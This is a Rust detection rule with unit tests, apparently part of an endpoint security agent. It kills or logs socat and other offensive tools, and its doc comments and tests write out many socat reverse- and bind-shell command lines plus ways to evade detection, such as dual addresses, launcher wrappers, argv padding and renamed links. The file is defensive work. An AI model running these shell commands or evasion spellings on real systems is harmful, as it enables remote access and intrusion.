//! R006 — Known offensive security tooling.
//!
//! External audit PROC-010: the rule killed every exec named `socat`,
//! `/usr/bin/socat` from the distribution included — a relay that
//! virtualisation consoles, port-forwarding and test harnesses run — and an
//! operator had no allowlist to stop it. Now:
//!
//! - the process allowlist applies, judged on what the kernel executed;
//! - a `socat` the distribution installed — its executable in `/usr/bin`,
//!   `/bin`, `/usr/sbin` or `/sbin` — is recorded (Log, High), unless one
//!   of its addresses runs a shell (`EXEC:`, `SYSTEM:` or `SHELL:` with
//!   `sh`, `bash`…), the reverse- or bind-shell shape, which is still
//!   killed;
//! - a `socat` from anywhere else, and the other tools (no distribution
//!   ships them on a server), are still killed.
//!
//! Lab PR 166: a kill takes the tree. The shell that `socat EXEC:` runs is
//! its child, and a copied tool is the payload itself.
//!
//! External audit EBPF-021: the exec record keeps the first 511 bytes of
//! the command line, and filler options (`-d` repeated) pushed the shell
//! address past them: the distribution's socat then read as a plain relay.
//! When the kernel marks the argv as cut (or unread) and the part kept
//! runs no shell, the rule does not conclude that none does: the exec is
//! recorded at the severity of one that does (Log, Critical), the cut
//! named, instead of the relay's High record.
//!
//! Lot 313 (external bug hunt, edition 1.4: BUG-112, BUG-119): one reader
//! of socat's addresses ([`address_runs_a_shell`]). A dual address
//! (`STDIO!!EXEC:/bin/sh`) holds two addresses in one argument, and a chain
//! (socat 1.8: `a|b`) several: each is read. `SYSTEM:` and `SHELL:` run
//! their command with `/bin/sh -c` (or `$SHELL`): a shell, whatever the
//! command. `EXEC:` runs its program directly: the program is read past the
//! launchers in front of it (`env`, `setsid`, `nohup`, `stdbuf`, `timeout`,
//! `nice`, `ionice`, `chrt`, `taskset`, `sudo`, `doas`, busybox), and a
//! shell, `script` (which starts one), or an interpreter running inline
//! code or its standard input (`python3 -c 'import pty;pty.spawn(…)'`, a
//! REPL; read by the interpreters' one reader) is a shell. The place of
//! the distribution's socat is the kernel's executed file, never the
//! caller's string (BUG-119: a string cut at 255 bytes named
//! `/usr/bin/./././…`); not known, it is no distribution's. And the tool is
//! named by its `comm` or by the kernel's executed file: a link to
//! `/usr/bin/socat` under another name is socat.
//!
//! Names are chosen by whoever runs the binary; a renamed copy of a tool
//! evades this rule, which the network and staging rules back up.

use std::sync::Arc;

use nn_model::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::attack::{AttackRef, Tactic};
use crate::decision::rules::program_identity;
use crate::decision::{rules::build_verdict, Rule};
use crate::posture::host::PostureHost;

const OFFSEC_COMMS: &[&str] = &["socat", "msfvenom", "meterpreter", "sliver", "havoc"];

/// Where a distribution installs socat. Not the other system trees: a
/// webroot under `/usr/share` is R010's, and a build in `/usr/local` or
/// `/opt` is the operator's to allowlist.
const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"];

pub struct R006ReverseShellTooling<H: PostureHost> {
    allowlist: Arc<CommAllowlist<H>>,
}

impl<H: PostureHost> R006ReverseShellTooling<H> {
    pub fn new(allowlist: Arc<CommAllowlist<H>>) -> Self {
        Self { allowlist }
    }
}

/// Lot 313 (BUG-112): socat's addresses in `argv` — every argument after
/// the program's name, a dual address (`a!!b`) split in two and a chain
/// (`a|b`) in its links.
fn addresses(argv: &[String]) -> impl Iterator<Item = &str> {
    argv.iter()
        .skip(1)
        .flat_map(|a| a.split("!!"))
        .flat_map(|a| a.split('|'))
}

/// One socat address runs a shell (module docs): `SYSTEM:` and `SHELL:`
/// always; `EXEC:` when its command line does
/// ([`program_identity::command_runs_a_shell`]). The address type in any
/// case; the command line up to socat's first `,` (its options).
fn address_runs_a_shell(address: &str) -> bool {
    let address = address.trim_start();
    let Some((kind, rest)) = address.split_once(':') else {
        return false;
    };
    match kind.to_ascii_lowercase().as_str() {
        "system" | "shell" => true,
        "exec" => {
            let command = rest.split(',').next().unwrap_or("");
            let words: Vec<String> = command
                .split_whitespace()
                .map(|w| w.trim_matches(['\'', '"']).to_string())
                .filter(|w| !w.is_empty())
                .collect();
            program_identity::command_runs_a_shell(&words)
        }
        _ => false,
    }
}

/// A socat address in `argv` runs a shell ([`address_runs_a_shell`]).
fn socat_runs_a_shell(argv: &[String]) -> bool {
    addresses(argv).any(address_runs_a_shell)
}

impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
    fn id(&self) -> &'static str {
        "R006_ReverseShellTooling"
    }
    fn name(&self) -> &'static str {
        "Reverse shell tooling"
    }
    fn category(&self) -> &'static str {
        "lateral_movement"
    }
    fn attack(&self) -> &'static [AttackRef] {
        const ATTACK: &[AttackRef] = &[
            AttackRef::new(Tactic::CommandAndControl, "T1095"),
            AttackRef::new(Tactic::Execution, "T1059.004"),
        ];
        ATTACK
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            exe,
            argv,
            ..
        } = event
        else {
            return None;
        };
        let tool = program_identity::tool_named(event, OFFSEC_COMMS)?;
        let judgement = super::judge_spawn(&self.allowlist, event);
        if judgement == Judgement::Allowed {
            return None;
        }
        let image = exe.path_or(filename);
        // lot 313 (BUG-119): the kernel's executed file, never the caller's
        // string
        let distribution = program_identity::kernel_image(event).is_some_and(|k| {
            crate::posture::lineage::in_system_tree(k)
                && DISTRIBUTION_BIN_DIRS.iter().any(|d| k.starts_with(d))
        });
        let cut = super::argv_cut_note(event);
        let verdict = if tool == "socat" && distribution && !socat_runs_a_shell(argv) {
            match cut {
                // External audit EBPF-021: no shell in the part kept is not
                // "no shell".
                Some(note) => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::Critical,
                    &format!(
                        "socat installed by the distribution ({image}) — not \
                         classified: {note}; an address past the cut may run a \
                         shell (EXEC:/SYSTEM:/SHELL:), so it is recorded at the \
                         severity of one that does, not as a relay"
                    ),
                ),
                None => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::High,
                    &format!(
                        "socat installed by the distribution ({image}) — recorded, not \
                         killed: the relay has legitimate uses; one running a shell \
                         (EXEC:/SYSTEM:/SHELL:) is killed"
                    ),
                ),
            }
        } else {
            build_verdict(
                self,
                event,
                ResponseAction::KillProcessTree,
                Severity::Critical,
                &super::with_argv_cut_note(
                    "Known offensive security tooling detected".to_string(),
                    event,
                ),
            )
        };
        Some(judgement.apply(verdict, comm))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // R08b (lab PR 251): on the portable test host.
    use crate::posture::host::testing::TestHost as H;
    type CommAllowlist = crate::config::comm_allowlist::CommAllowlist<H>;
    type R006ReverseShellTooling = super::R006ReverseShellTooling<H>;
    use crate::decision::rules::testutil::{argv_cut, kernel_exe, spawn, spawn_exe};

    /// Lot 313 (BUG-119): an exec of `filename` as the LSM hook reports it
    /// — the distribution's socat is placed by the kernel's path only.
    fn spawn_full(comm: &str, filename: &str, uid: u32, argv: &[&str], parent_comm: &str) -> Event {
        kernel_exe(crate::decision::rules::testutil::spawn_full(
            comm,
            filename,
            uid,
            argv,
            parent_comm,
        ))
    }

    fn rule() -> R006ReverseShellTooling {
        R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
    }

    #[test]
    fn fires_on_each_offsec_tool() {
        for comm in OFFSEC_COMMS {
            let v = rule()
                .evaluate(&spawn(comm, "/home/alice/whatever"))
                .unwrap_or_else(|| panic!("should fire on {comm}"));
            assert_eq!(v.action, ResponseAction::KillProcessTree);
            assert_eq!(v.severity, Severity::Critical);
        }
    }

    /// Lab PR 166: the shell a system socat runs, and a copied tool's
    /// children, die with it.
    #[test]
    fn r006_kills_the_process_tree() {
        let shell = spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:127.0.0.1:9", "EXEC:/bin/sh"],
            "bash",
        );
        for e in [shell, spawn_exe("socat", "socat", "/tmp/socat", 0)] {
            let v = rule().evaluate(&e).expect("fires");
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{e:?}");
        }
    }

    #[test]
    fn ignores_benign_tools() {
        assert!(rule().evaluate(&spawn("ssh", "/usr/bin/ssh")).is_none());
    }

    #[test]
    fn match_is_exact_not_prefix() {
        assert!(rule()
            .evaluate(&spawn("socat-helper", "/usr/bin/socat-helper"))
            .is_none());
    }

    /// External audit PROC-010: the distribution's socat is recorded; a
    /// copy anywhere else, and the other tools from anywhere, are killed.
    #[test]
    fn r006_system_socat_is_recorded_a_copy_is_killed() {
        let v = rule()
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .unwrap();
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::High);
        for (comm, path) in [
            ("socat", "/home/alice/socat"),
            ("socat", "/usr/bin/../../tmp/socat"),
            ("socat", "/usr/share/nginx/html/socat"),
            ("socat", "/opt/tools/socat"),
            ("msfvenom", "/usr/bin/msfvenom"),
        ] {
            let v = rule().evaluate(&spawn_exe(comm, comm, path, 0)).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{path}");
            assert_eq!(v.severity, Severity::Critical, "{path}");
        }
    }

    /// External audit PROC-010: a system socat that runs a shell is the
    /// reverse- or bind-shell shape, and is killed.
    #[test]
    fn r006_system_socat_running_a_shell_is_killed() {
        for args in [
            &[
                "socat",
                "TCP:10.0.0.9:4444",
                "EXEC:/bin/sh,pty,stderr,setsid",
            ][..],
            &["socat", "tcp-listen:9001,fork", "exec:bash -li"][..],
            &["socat", "-d", "TCP:h:1", "SYSTEM:'sh -i'"][..],
            &["socat", "TCP:h:1", "SHELL:zsh"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{args:?}");
        }
        for args in [
            &[
                "socat",
                "UNIX-CONNECT:/run/qemu/serial0",
                "STDIO,raw,echo=0",
            ][..],
            &["socat", "TCP-LISTEN:8080,fork", "TCP:127.0.0.1:80"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::Log, "{args:?}");
        }
    }

    /// External audit EBPF-021: filler options push the shell address past
    /// the 511 bytes the kernel keeps. A cut argv whose kept part runs no
    /// shell is not a relay: recorded at Critical, the cut named. A whole
    /// argv keeps the relay's High record; a shell in the kept part is
    /// still killed; a copy is still killed, the cut named.
    #[test]
    fn r006_socat_with_truncated_argv_is_logged() {
        let mut args = vec!["socat"];
        args.extend(std::iter::repeat_n("-d", 200));
        args.push("TCP:127.0.0.1:9");
        let padded = argv_cut(spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash"));
        let v = rule().evaluate(&padded).expect("fires");
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::Critical);
        assert!(
            v.reasoning.contains("argv truncated at 511 bytes"),
            "{}",
            v.reasoning
        );
        assert!(v.reasoning.contains("not classified"), "{}", v.reasoning);

        // Unread argv: the same, named as unread.
        let unread = argv_cut(spawn_exe("socat", "/usr/bin/socat", "/usr/bin/socat", 0));
        let v = rule().evaluate(&unread).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::Critical)
        );
        assert!(v.reasoning.contains("argv not read"), "{}", v.reasoning);

        // The same argv, whole: the relay's record.
        let whole = spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash");
        let v = rule().evaluate(&whole).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::High)
        );

        // A shell in the part kept: killed, cut or not.
        let shell = argv_cut(spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "EXEC:/bin/sh"],
            "bash",
        ));
        let v = rule().evaluate(&shell).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("argv truncated"), "{}", v.reasoning);

        // A copy: killed as before, the cut named.
        let copy = argv_cut(spawn_exe("socat", "socat", "/tmp/socat", 0));
        let v = rule().evaluate(&copy).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
    }

    /// External audit PROC-010: an operator allowlist, judged on what the
    /// kernel executed: the installed socat is exempt, a copy is not.
    #[test]
    fn r006_allowlisted_by_identity_is_exempt() {
        let r = R006ReverseShellTooling::new(Arc::new(CommAllowlist::from_iter_owned([
            "socat".to_string()
        ])));
        assert!(r
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .is_none());
        let v = r
            .evaluate(&spawn_exe("socat", "./socat", "/home/alice/socat", 0))
            .expect("a copy is not the allowlisted socat");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("named 'socat'"), "{}", v.reasoning);
    }
}

/// Lot 313 (external bug hunt, edition 1.4: BUG-112): a socat dual address
/// (`read!!write`) holds two addresses in one argument;
/// `socat_runs_a_shell` matched `EXEC:`/`SYSTEM:`/`SHELL:` only at the
/// start of the argument, and the program as the first word after it.
#[cfg(test)]
mod bug112 {
    use super::*;
    use crate::decision::rules::testutil::{kernel_exe, spawn_exe, spawn_full};
    use crate::posture::host::testing::TestHost as H;

    fn judged(args: &[&str]) -> (ResponseAction, Severity) {
        let e = kernel_exe(spawn_full("socat", "/usr/bin/socat", 1000, args, "bash"));
        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
            .evaluate(&e)
            .expect("fires");
        (v.action, v.severity)
    }

    fn not_killed(cases: &[&[&str]]) -> Vec<String> {
        cases
            .iter()
            .filter_map(|args| {
                let got = judged(args);
                (got != (ResponseAction::KillProcessTree, Severity::Critical))
                    .then(|| format!("{args:?} -> {got:?}"))
            })
            .collect()
    }

    #[test]
    fn bug112_dual_address_running_a_shell_is_killed() {
        let missed = not_killed(&[
            &["socat", "TCP:10.0.0.1:4444", "STDIO!!EXEC:/bin/sh"],
            &["socat", "TCP-LISTEN:4444,reuseaddr", "-!!exec:bash -li"],
            &["socat", "TCP:10.0.0.1:4444", "STDIN!!SHELL:zsh"],
        ]);
        assert!(
            missed.is_empty(),
            "distribution socat whose dual address runs a shell is not killed: {missed:?}"
        );
    }

    /// Beyond the report's fix (`split("!!")`): the shell was matched on
    /// the first word after `EXEC:`/`SYSTEM:` only — a launcher in front
    /// of it, or `SYSTEM:` (which always runs `/bin/sh -c`) with another
    /// first word, still read as a plain relay.
    #[test]
    fn bug112_other_shell_spellings_the_report_fix_still_misses() {
        let missed = not_killed(&[
            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/env sh"],
            &["socat", "TCP:10.0.0.1:4444", "SYSTEM:exec bash -i"],
            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/setsid bash -i"],
        ]);
        assert!(
            missed.is_empty(),
            "shell run through a launcher, not killed: {missed:?}"
        );
    }

    /// Lot 313's mini-hunt: more spellings of the same shape — a chain's
    /// link (socat 1.8), a launcher's options and operands, an interpreter
    /// running inline code or a REPL (`pty.spawn`), `script`, busybox, any
    /// case, `SYSTEM:` running anything.
    #[test]
    fn bug112_variants_are_killed() {
        let missed = not_killed(&[
            &["socat", "TCP:h:1", "OPENSSL:h:443|EXEC:/bin/sh"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:env -i PATH=/bin bash -i,pty,stderr",
            ],
            &["socat", "TCP:h:1", "EXEC:timeout -s KILL 3600 sh"],
            &["socat", "TCP:h:1", "EXEC:nohup stdbuf -o0 /bin/bash -i"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            ],
            &["socat", "TCP:h:1", "EXEC:perl -e 'exec \"/bin/sh\"'"],
            &["socat", "TCP:h:1", "EXEC:python3,pty"],
            &["socat", "TCP:h:1", "EXEC:script -qc /bin/bash /dev/null"],
            &["socat", "TCP:h:1", "EXEC:busybox sh"],
            &["socat", "TCP:h:1", "Exec:/bin/sh"],
            &["socat", "TCP:h:1", "SYSTEM:while read c; do $c; done"],
            &["socat", "TCP:h:1", "system:id"],
            // a space after the dual address's `!!` (read as socat may)
            &["socat", "TCP:h:1", "STDIO!! EXEC:/bin/sh"],
        ]);
        assert!(missed.is_empty(), "not killed: {missed:?}");
    }

    /// Guard: a dual relay without a shell stays the relay's record, and so
    /// does a program that runs no shell, through a launcher or not.
    #[test]
    fn bug112_guard_dual_relay_without_a_shell_is_recorded() {
        for args in [
            &["socat", "TCP:10.0.0.1:4444", "STDIO!!OPEN:/tmp/log,creat"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:nohup /usr/bin/tail -f /var/log/syslog",
            ],
            &["socat", "TCP:h:1", "EXEC:python3 /srv/relay/main.py"],
            &["socat", "TCP:h:1", "EXEC:busybox cat"],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::Log, Severity::High),
                "{args:?}"
            );
        }
    }

    /// Lot 313 (BUG-119 on R006): the distribution's socat is placed by the
    /// kernel's executed file; the caller's string — a cut one, or any one
    /// the kernel's path is not known for — places none: a copy's kill.
    #[test]
    fn bug119_a_socat_the_kernel_did_not_place_is_no_distribution_s() {
        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
        let mut cut = spawn_full(
            "socat",
            &format!("/usr/bin/{}", "./".repeat(123)),
            1000,
            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
            "bash",
        );
        if let Event::ProcessSpawn {
            filename_truncated, ..
        } = &mut cut
        {
            *filename_truncated = true;
        }
        let v = r.evaluate(&cut).expect("fires");
        assert_eq!(v.action, ResponseAction::KillProcessTree, "{}", v.reasoning);
        let caller_only = spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
            "bash",
        );
        let v = r.evaluate(&caller_only).expect("fires");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        // the kernel's path: the relay's record
        let v = r.evaluate(&kernel_exe(caller_only)).expect("fires");
        assert_eq!(v.action, ResponseAction::Log);
    }

    /// Lot 313's mini-hunt: a link to the distribution's socat under another
    /// name has its link's `comm`; the kernel executed socat, and R006
    /// judges it so — a shell it runs is killed, a relay recorded.
    #[test]
    fn a_link_to_socat_under_another_name_is_socat() {
        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
        let link = |args: &[&str]| {
            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat", 0);
            if let Event::ProcessSpawn { argv, .. } = &mut e {
                *argv = args.iter().map(|s| s.to_string()).collect();
            }
            r.evaluate(&e).map(|v| (v.action, v.severity))
        };
        assert_eq!(
            link(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
            Some((ResponseAction::KillProcessTree, Severity::Critical))
        );
        assert_eq!(
            link(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
            Some((ResponseAction::Log, Severity::High))
        );
        // the lab (12/11, Ubuntu 24.04 and Debian 13): socat 1.8's file is
        // `/usr/bin/socat1`; a link to it under another name ran its shell
        // with no record
        let socat1 = |args: &[&str]| {
            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat1", 0);
            if let Event::ProcessSpawn { argv, .. } = &mut e {
                *argv = args.iter().map(|s| s.to_string()).collect();
            }
            r.evaluate(&e).map(|v| (v.action, v.severity))
        };
        assert_eq!(
            socat1(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
            Some((ResponseAction::KillProcessTree, Severity::Critical))
        );
        assert_eq!(
            socat1(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
            Some((ResponseAction::Log, Severity::High))
        );
    }
}
